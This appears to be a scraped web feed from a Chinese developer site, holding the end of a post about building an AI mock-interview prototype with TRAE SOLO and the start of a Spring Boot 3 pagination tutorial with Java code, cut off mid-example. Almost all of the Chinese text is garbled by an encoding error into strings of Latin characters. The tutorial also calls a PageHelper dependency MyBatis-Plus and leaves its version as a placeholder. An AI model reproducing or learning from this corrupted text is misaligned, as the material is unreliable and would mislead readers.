<p>å¼€å‘è¿‡ç¨‹ä¸­æœ€è€—æ—¶çš„å¾€å¾€æ˜¯ Debugã€‚TRAE SOLO çš„ DiffView å·¥å…·åœ¨å®šä½å¤æ‚ Bug æ—¶å±•ç°äº†æé«˜çš„æ•ˆç‡ã€‚è¿™äº›bugè®©æˆ‘æ”¹ï¼Œä¼°è®¡å¤´å‘å°±ä¿ä¸ä½äº†ã€‚æŒºå¤šéƒ½æ˜¯é‚£ç§å°ä¼—åˆé’»çš„æŠ¥é”™ï¼Œä¸ç‹ ç‹ çœ‹æ–‡æ¡£åŸºæœ¬æ²¡è¾™çš„ã€‚</p>
<p>ä»¥â€œæ‘„åƒå¤´é»‘å±â€é—®é¢˜ä¸ºä¾‹ï¼Œåœ¨ React ç»„ä»¶é‡æ–°æ¸²æŸ“æ—¶ï¼Œ<code>&lt;video&gt;</code> æ ‡ç­¾çš„ DOM èŠ‚ç‚¹å¸¸è¢«æ„å¤–ç§»é™¤ã€‚æˆ‘é€šè¿‡ DiffView å¯¹æ¯”äº†é—®é¢˜å‰åçš„ä»£ç å¿«ç…§ï¼Œè¿…é€Ÿé”å®šäº†æ˜¯åª’ä½“æµå¼•ç”¨ä¸¢å¤±çš„é—®é¢˜ã€‚è§£å†³æ–¹æ¡ˆæ˜¯å°†åª’ä½“æµæ‰˜ç®¡åœ¨ <code>useRef</code> ä¸­ï¼Œå¹¶é€šè¿‡ CSS æ§åˆ¶æ˜¾éšè€Œéé”€æ¯ç»„ä»¶ã€‚</p>
<p><strong>AIæ—¶ä»£çš„å¥½å¤„ï¼Œä¸ç»†çœ‹æ–°API/åº“çš„æ–‡æ¡£ï¼Œä¹Ÿèƒ½å†™åŠŸèƒ½</strong></p>
<h2 data-id="heading-7">äº”ã€ç”¨æˆ·ä½“éªŒï¼šç»†èŠ‚å†³å®šæˆè´¥</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b694142e00614da9b90572e83af5d782~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGlTdGV3aWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765715511&amp;x-signature=uwAsZn0oIZ7VYh5ylxrNTs3knVA%3D" alt="æˆªå±2025-12-05 00.27.05.png" loading="lazy"/></p>
<p>æŠ€æœ¯è·‘é€šåªæ˜¯èµ·ç‚¹ï¼Œä½“éªŒä¼˜åŒ–æ‰æ˜¯ç»ˆç‚¹ã€‚</p>
<p>åœ¨ TRAE SOLO çš„å»ºè®®ä¸‹ï¼Œæˆ‘å¢åŠ äº†â€œè®¾å¤‡é¢„æ£€â€ç¯èŠ‚ï¼Œå¼ºåˆ¶åœ¨é¢è¯•å‰æ£€æµ‹éº¦å…‹é£æƒé™ï¼Œé¿å…äº†ç”¨æˆ·è¿›å…¥é¢è¯•åâ€œå¤±å£°â€çš„å°´å°¬ã€‚åŒæ—¶ï¼Œé’ˆå¯¹ API å¶å‘çš„é™æµé—®é¢˜ï¼Œè®¾è®¡äº†æ¸©å’Œçš„ç­‰å¾…æç¤ºå’Œ Loading åŠ¨æ•ˆã€‚</p>
<p>è¿™äº›çœ‹ä¼¼å¾®ä¸è¶³é“çš„ç»†èŠ‚ï¼Œæ„æˆäº†ç”¨æˆ·å¯¹äº§å“â€œé è°±â€çš„ç¬¬ä¸€å°è±¡ã€‚<strong>ç”¨æˆ·ä½“éªŒä¸æ˜¯ä¸€ä¸ªå•ä¸€çš„åŠŸèƒ½ï¼Œè€Œæ˜¯æ— æ•°ä¸ªå¾®å°ç»†èŠ‚çš„å åŠ ã€‚</strong></p>
<p>è¿˜æœ‰å°±æ˜¯è¯­éŸ³è¯†åˆ«ä¸­è‹±æ–‡æ·· + é”™åˆ«å­—é—®é¢˜ï¼Œæˆ‘çœ‹è®¯é£æœ‰ç±»ä¼¼å¤šè¯­è¨€æ¨¡å‹ï¼Œä½†æ˜¯ä»·æ ¼æŒºé«˜çš„ã€‚å¦‚æœè®¯é£çš„æœ‹å‹çœ‹åˆ°äº†ï¼Œå¯ä»¥è”ç³»æˆ‘ï¼Œèƒ½ä¸èƒ½è°ˆåˆä½œï¼ˆç™½å«–ï¼‰ã€‚æˆ‘å®˜ç½‘ä¸‹é¢æŒ‚ä½ ä»¬çš„åˆä½œé“¾æ¥</p>
<h2 data-id="heading-8">å…­ã€æ€»ç»“ä¸å±•æœ›</h2>
<p>é€šè¿‡<strong>è¿™ä¸€ä¸ªæ™šä¸Š</strong>çš„æé™å¼€å‘ï¼Œæˆ‘ä¸ä»…å®Œæˆäº†ä¸€ä¸ªåŒ…å«ç®€å†è§£æã€å®æ—¶è¯­éŸ³è½¬å½•ã€AI åŠ¨æ€è¯„ä¼°çš„ MVP äº§å“ï¼Œæ›´é‡è¦çš„æ˜¯éªŒè¯äº†ä¸€ç§å…¨æ–°çš„å¼€å‘èŒƒå¼ã€‚</p>
<p>TRAE SOLO åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æ‰®æ¼”çš„ä¸å†æ˜¯ç®€å•çš„ä»£ç ç”Ÿæˆå™¨ï¼Œè€Œæ˜¯ä¸€ä¸ªå…¨é“¾è·¯çš„æ™ºèƒ½åŠ©æ‰‹ã€‚å®ƒè®©å¼€å‘è€…ä»ç¹ççš„è¯­æ³•ç»†èŠ‚ä¸­è§£æ”¾å‡ºæ¥ï¼Œå°†ç²¾åŠ›èšç„¦äºæ¶æ„è®¾è®¡ã€ä¸šåŠ¡é€»è¾‘å’Œç”¨æˆ·ä½“éªŒè¿™äº›æ›´å…·åˆ›é€ æ€§çš„ç¯èŠ‚ã€‚</p>
<p>æœªæ¥ï¼Œè¿™ä¸ªäº§å“è¿˜å¯ä»¥å‘â€œé¢è¯•å½•åƒå›æ”¾â€ã€â€œé¢è¯•ç»“æœæŠ¥å‘Šâ€ã€â€œå“åº”é€Ÿåº¦è°ƒä¼˜â€ã€â€œæ¨¡å‹ä¼˜åŒ–ï¼ˆä½†æ˜¯è´µï¼Œè¦æƒ³å¥½å•†ä¸šæ¨¡å¼ï¼‰â€ç­‰æ–¹å‘æ‰©å±•ã€‚ä½†æ— è®ºåŠŸèƒ½å¦‚ä½•è¿­ä»£ï¼ŒæŠ€æœ¯æœåŠ¡äºäººçš„æ ¸å¿ƒé€»è¾‘ä¸ä¼šå˜ã€‚</p>
<p><strong>é‡æ„ä»£ç åªæ˜¯å¼€å§‹ï¼Œé‡æ„è‡ªæˆ‘æ‰æ˜¯ç»ˆå±€ã€‚åœ¨è¿™ä¸ªæ—¶ä»£ï¼Œ æ¯”â€œé€šè¿‡é¢è¯•â€œæ›´é‡è¦çš„ï¼Œ æ˜¯æ‹¥æœ‰â€œéšæ—¶å°†æƒ³æ³•è½åœ°â€œçš„åº•æ°”ã€‚</strong></p>
<h2 data-id="heading-9">é™„å½•ï¼šä½“éªŒåœ°å€ä¸ç¢ç¢å¿µ</h2>
<p><strong>ğŸ”— ä½“éªŒåœ°å€</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.quizport.org%2F" target="_blank" title="https://www.quizport.org/" ref="nofollow noopener noreferrer">www.quizport.org/</a></p>
<p><strong>âš ï¸ å‡ ç‚¹å…è´£å£°æ˜ï¼ˆæ±‚è½»å–·ï¼‰ï¼š</strong></p>
<ol>
<li><strong>å…³äºé¢åº¦</strong>ï¼šä¸ºäº†éªŒè¯ MVP çš„ä½æˆæœ¬å¯è¡Œæ€§ï¼Œæˆ‘ç›®å‰æ¥çš„éƒ½æ˜¯ Deepgram å’Œ Groq çš„å…è´¹/å¼€å‘ç‰ˆ APIã€‚å¦‚æœä½ å‘ç°ç‚¹å‡»æ²¡ååº”æˆ–è€…æŠ¥é”™ï¼Œå¤§æ¦‚ç‡æ˜¯ä»Šå¤©çš„å…è´¹é¢åº¦è¢«åˆ·çˆ†äº†â€¦â€¦è¯·å¤šåŒ…æ¶µï¼Œæˆ–è€…æ˜å¤©èµ¶æ—©ã€‚</li>
<li><strong>å…³äºç½‘ç»œ</strong>ï¼šç›®å‰åŸŸåè¿˜æ²¡æ¥å¾—åŠåšå›½å†…çš„ CNAME ä¼˜åŒ–ï¼ˆä¸»è¦æ˜¯ä¸€æ™šä¸Šè‚å®Œå¤ªç´¯äº†ï¼Œçœ¼çš®æ‰“æ¶å®åœ¨é¡¶ä¸ä½å…ˆç¡äº† ğŸ’¤ï¼‰ã€‚å›½å†…ç›´è¿å¯èƒ½ä¼šæœ‰ç‚¹æ…¢æˆ–è€…æ— æ³•è®¿é—®ï¼Œå»ºè®®æŒ‚ä¸ªæ¢¯å­ä½“éªŒï¼Œåç»­æœ‰ç©ºæˆ‘ä¼šä¼˜åŒ–ä¸€ä¸‹çº¿è·¯ã€‚</li>
<li><strong>å…³äºåé¦ˆ</strong>ï¼šè¿™åªæ˜¯ä¸€ä¸ª MVP ç‰ˆæœ¬çš„ Demoï¼ŒåŠŸèƒ½è¿˜å¾ˆç®€é™‹ã€‚å¦‚æœä½ æœ‰ä»»ä½•å»ºè®®ã€Bug åé¦ˆï¼Œæˆ–è€…å•çº¯æƒ³èŠèŠæŠ€æœ¯ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€ã€‚</li>
</ol>
<p>Code is cheap, show me the feedback. âœŒï¸</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot3 åˆ†é¡µæ“ä½œå…¨è§£æï¼šä»åŸºç¡€åˆ°å®æˆ˜]]></title>    <link>https://juejin.cn/post/7580834172060844067</link>    <guid>https://juejin.cn/post/7580834172060844067</guid>    <pubDate>2025-12-08T02:50:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580834172060844067" data-draft-id="7580834172060827683" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot3 åˆ†é¡µæ“ä½œå…¨è§£æï¼šä»åŸºç¡€åˆ°å®æˆ˜"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜,åç«¯,Java"/> <meta itemprop="datePublished" content="2025-12-08T02:50:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜è¥¿è¥¿"/> <meta itemprop="url" content="https://juejin.cn/user/326976944214804"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot3 åˆ†é¡µæ“ä½œå…¨è§£æï¼šä»åŸºç¡€åˆ°å®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/326976944214804/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜è¥¿è¥¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T02:50:36.000Z" title="Mon Dec 08 2025 02:50:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨å½“ä»Šçš„äº’è”ç½‘è½¯ä»¶å¼€å‘é¢†åŸŸï¼Œå¤„ç†æµ·é‡æ•°æ®æ˜¯ä¸€ä¸ªç»•ä¸å¼€çš„è¯é¢˜ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œä½ å¼€å‘çš„åº”ç”¨ç¨‹åºéœ€è¦å±•ç¤ºæ•°ä»¥ä¸‡è®¡ç”šè‡³æ›´å¤šçš„ç”¨æˆ·ä¿¡æ¯ã€å•†å“åˆ—è¡¨æˆ–è€…æ–‡ç« å†…å®¹ï¼Œå¦‚æœä¸€æ¬¡æ€§å°†æ‰€æœ‰æ•°æ®åŠ è½½åˆ°å‰ç«¯ï¼Œä¸ä»…ä¼šä¸¥é‡æ‹–æ…¢ç³»ç»Ÿå“åº”é€Ÿåº¦ï¼Œè¿˜å¯èƒ½å¯¼è‡´åº”ç”¨ç¨‹åºå´©æºƒã€‚è¿™æ—¶å€™ï¼Œåˆ†é¡µæ“ä½œå°±å¦‚åŒæ•‘æ˜Ÿä¸€èˆ¬ç™»åœºï¼Œå®ƒèƒ½å°†æ•°æ®åˆç†åœ°åˆ†æ®µå±•ç¤ºï¼Œå¤§å¤§æå‡ç”¨æˆ·ä½“éªŒå’Œç³»ç»Ÿæ€§èƒ½ã€‚ä»Šå¤©ï¼Œå’±ä»¬å°±æ·±å…¥æ¢è®¨åœ¨ Spring Boot3 ä¸­å¦‚ä½•å·§å¦™å®ç°åˆ†é¡µæ“ä½œã€‚</p>
<h2 data-id="heading-1">ä¸ºä»€ä¹ˆè¦ä½¿ç”¨åˆ†é¡µ</h2>
<p>åœ¨ç°ä»£ Web åº”ç”¨å¼€å‘çš„å¤§ç¯å¢ƒä¸‹ï¼Œåˆ†é¡µå’Œæ’åºå·²ç„¶æˆä¸ºå¤„ç†æµ·é‡æ•°æ®æ—¶ï¼Œæå‡ç”¨æˆ·ä½“éªŒä¸ç³»ç»Ÿæ€§èƒ½çš„å…³é”®æ‰€åœ¨ã€‚å®ƒä»¬å®›å¦‚ä¸€å¯¹é»˜å¥‘çš„æ­æ¡£ï¼Œå¹¿æ³›åº”ç”¨äº RESTful APIã€åå°ç®¡ç†ç³»ç»Ÿç­‰è¯¸å¤šåœºæ™¯ã€‚æ® 2024 å¹´ Stack Overflow å¼€å‘è€…è°ƒæŸ¥æ˜¾ç¤ºï¼Œçº¦ 60% çš„åç«¯å¼€å‘è€…åœ¨å¤„ç†åˆ—è¡¨æ•°æ®æ—¶ä¼šä½¿ç”¨åˆ†é¡µæŠ€æœ¯ã€‚å°±æ‹¿å¸¸è§çš„ç”µå•†å¹³å°å•†å“å±•ç¤ºé¡µé¢æ¥è¯´ï¼Œå½“ç”¨æˆ·æœç´¢ â€œè¿åŠ¨é‹â€ï¼Œå¯èƒ½ä¼šå‡ºç°æˆåƒä¸Šä¸‡æ¡ç»“æœï¼Œå¦‚æœä¸åˆ†é¡µï¼Œç”¨æˆ·ä¸ä»…è¦ç­‰å¾…æ¼«é•¿çš„åŠ è½½æ—¶é—´ï¼Œè€Œä¸”é¢å¯¹æ»¡å±å¯†å¯†éº»éº»çš„æ•°æ®ï¼Œä¹Ÿä¼šæ— ä»ä¸‹æ‰‹ã€‚åˆ†é¡µæ“ä½œé€šè¿‡å°†æ•°æ®æŒ‰é¡µåˆ’åˆ†ï¼Œæ¯æ¬¡ä»…åŠ è½½éƒ¨åˆ†æ•°æ®ï¼Œæå¤§åœ°å‡è½»äº†æ•°æ®åº“å’ŒæœåŠ¡å™¨çš„è´Ÿè½½å‹åŠ›ï¼Œè®©ç”¨æˆ·èƒ½å¤Ÿæ›´é«˜æ•ˆåœ°æµè§ˆæ•°æ®ã€‚</p>
<h2 data-id="heading-2">Spring Boot3 å®ç°åˆ†é¡µçš„æ–¹å¼</h2>
<p><strong>ï¼ˆä¸€ï¼‰åŸºäº Spring Data JPA çš„åˆ†é¡µ</strong></p>
<p>Spring Data JPA ä¸º Java å¼€å‘è€…æä¾›äº†æä¸ºä¾¿æ·çš„æ–¹å¼æ¥å®ç°æ•°æ®è®¿é—®å±‚ã€‚åœ¨åˆ†é¡µæ–¹é¢ï¼Œå®ƒä¸»è¦é€šè¿‡Pageableæ¥å£æ¥è¾¾æˆã€‚Pageableæ¥å£å¯è°“æ˜¯åˆ†é¡µæ“ä½œçš„æ ¸å¿ƒæ¢çº½ï¼Œå®ƒåŒ…å«äº†é¡µç ã€æ¯é¡µå¤§å°ä»¥åŠæ’åºä¿¡æ¯ï¼Œèƒ½å¤Ÿç”ŸæˆLIMITã€OFFSETå’ŒORDER BYè¯­å¥ï¼Œä»è€Œç²¾å‡†åœ°æ§åˆ¶æŸ¥è¯¢ç»“æœã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">Pageable <span class="hljs-attr">pageable</span> = PageRequest.of(pageNumber, pageSize, Sort.by(Sort.Direction.ASC, <span class="hljs-string">"id"</span>))<span class="hljs-comment">;</span>
Page&lt;User&gt; <span class="hljs-attr">users</span> = userRepository.findAll(pageable)<span class="hljs-comment">;</span>
</code></pre>
<p>è¿™é‡Œé€šè¿‡PageRequest.ofæ–¹æ³•åˆ›å»ºäº†Pageableå®ä¾‹ï¼ŒæŒ‡å®šäº†å½“å‰é¡µç pageNumberã€æ¯é¡µå¤§å°pageSizeä»¥åŠæ’åºæ–¹å¼ï¼ˆæŒ‰ç…§idå­—æ®µå‡åºæ’åˆ—ï¼‰ã€‚ç„¶åï¼Œè°ƒç”¨userRepositoryçš„findAllæ–¹æ³•ï¼Œå¹¶ä¼ å…¥Pageableå®ä¾‹ï¼Œå³å¯è½»æ¾è·å–åˆ†é¡µåçš„ç”¨æˆ·æ•°æ®ã€‚Pageå¯¹è±¡ä¼šè¿”å›åˆ†é¡µç»“æœï¼Œå…¶ä¸­åŒ…å«äº†å†…å®¹ï¼ˆcontentï¼‰ã€åˆ†é¡µä¿¡æ¯ï¼ˆpageableï¼‰ä»¥åŠæ€»æ•°ï¼ˆtotalElementsï¼‰ï¼Œä¸ºå¼€å‘è€…æä¾›äº†å…¨é¢çš„åˆ†é¡µæ•°æ®ã€‚</p>
<p><strong>ï¼ˆäºŒï¼‰åŸºäº MyBatis - Plus çš„åˆ†é¡µ</strong></p>
<p>MyBatis - Plus æ˜¯åœ¨ MyBatis åŸºç¡€ä¸Šè¿›è¡Œå¢å¼ºçš„å·¥å…·ï¼Œå®ƒç®€åŒ–äº† MyBatis çš„å¼€å‘æµç¨‹ï¼Œåœ¨åˆ†é¡µåŠŸèƒ½ä¸Šæ›´æ˜¯è¡¨ç°å‡ºè‰²ã€‚å®ç°åˆ†é¡µæ“ä½œï¼Œé¦–å…ˆéœ€è¦å¼•å…¥pagehelper - spring - boot - starterä¾èµ–ã€‚</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>pagehelper - spring - boot - starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>æœ€æ–°ç‰ˆæœ¬<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>é…ç½®å®Œæˆåï¼Œåœ¨ä»£ç ä¸­ä½¿ç”¨PageHelperæ’ä»¶è¿›è¡Œåˆ†é¡µæ“ä½œï¼Œç®€ç›´æ˜“å¦‚åæŒã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserMapper userMapper;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">queryUserListPaged</span><span class="hljs-params">(SysUser user, Integer page, Integer pageSize)</span> {
        <span class="hljs-comment">// å¼€å§‹åˆ†é¡µ</span>
        PageHelper.startPage(page, pageSize);
        <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(SysUser.class);
        Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria</span> <span class="hljs-operator">=</span> example.createCriteria();
        <span class="hljs-keyword">if</span> (!StringUtils.isEmptyOrWhitespace(user.getUsername())) {
            criteria.andLike(<span class="hljs-string">"username"</span>, <span class="hljs-string">"%"</span> + user.getUsername() + <span class="hljs-string">"%"</span>);
        }
        <span class="hljs-keyword">if</span> (!StringUtils.isEmptyOrWhitespace(user.getNickname())) {
            criteria.andLike(<span class="hljs-string">"nickname"</span>, <span class="hljs-string">"%"</span> + user.getNickname() + <span class="hljs-string">"%"</span>);
        }
        List&lt;User&gt; userList = userMapper.selectByExample(example);
        <span class="hljs-keyword">return</span> userList;
    }
}
</code></pre>
<p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œå…³é”®çš„ä¸€è¡Œä»£ç PageHelper.startPage(page, pageSize)å°±æ ‡è¯†ç€åˆ†é¡µæ“ä½œçš„å¼€å§‹ã€‚PageHelperæ’ä»¶ä¼šé€šè¿‡å…¶å†…éƒ¨å¼ºå¤§çš„æ‹¦æˆªå™¨ï¼Œå°†åŸæœ¬çš„æŸ¥è¯¢ SQL è¯­å¥å·§å¦™åœ°è½¬åŒ–ä¸ºåˆ†é¡µ SQL è¯­å¥ï¼Œä»è€Œå®ç°é«˜æ•ˆçš„åˆ†é¡µæŸ¥è¯¢ã€‚ä¸è¿‡ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼ŒPageHelper.startPage(pageNum, pageSize)æ–¹æ³•ä¸€å®šè¦ç´§è´´åœ¨åˆ—è¡¨æŸ¥è¯¢æ–¹æ³•ä¹‹å‰è°ƒç”¨ï¼Œåªæœ‰è¿™æ ·ï¼Œåœ¨æŸ¥è¯¢æ—¶æ‰èƒ½å‡†ç¡®æŸ¥å‡ºç›¸åº”çš„æ•°æ®é‡ï¼Œå¹¶ä¸”åŒæ—¶æŸ¥è¯¢å‡ºæ•°æ®æ€»æ•°ã€‚</p>
<h2 data-id="heading-3">åˆ†é¡µå®ç°çš„è¯¦ç»†æ­¥éª¤ä¸ä»£ç ç¤ºä¾‹</h2>
<p><strong>ï¼ˆä¸€ï¼‰åŸºäº Spring Data JPA çš„å®Œæ•´ç¤ºä¾‹</strong></p>
<p><strong>åˆ›å»ºå®ä½“ç±»</strong></p>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªUserå®ä½“ç±»ï¼Œç”¨äºè¡¨ç¤ºç”¨æˆ·ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Entity</span>
<span class="hljs-variable">@Table</span>(name = <span class="hljs-string">"users"</span>)
public class User {
    <span class="hljs-variable">@Id</span>
    <span class="hljs-variable">@GeneratedValue</span>(strategy = GenerationType.IDENTITY)
    private Long id;
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">username</span>;
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">email</span>;
    <span class="hljs-comment">// å…¶ä»–å­—æ®µåŠGetterã€Setteræ–¹æ³•çœç•¥</span>
}
</code></pre>
<p><strong>åˆ›å»º Repository æ¥å£</strong></p>
<p>ç»§æ‰¿JpaRepositoryï¼ŒSpring Data JPA ä¼šè‡ªåŠ¨ä¸ºæˆ‘ä»¬å®ç°åŸºæœ¬çš„æ•°æ®è®¿é—®æ–¹æ³•ï¼ŒåŒ…æ‹¬åˆ†é¡µæŸ¥è¯¢ç›¸å…³æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">UserRepository</span> <span class="hljs-title">extends</span> <span class="hljs-title">JpaRepository</span>&lt;<span class="hljs-title">User</span>, <span class="hljs-title">Long</span>&gt; {
}
</code></pre>
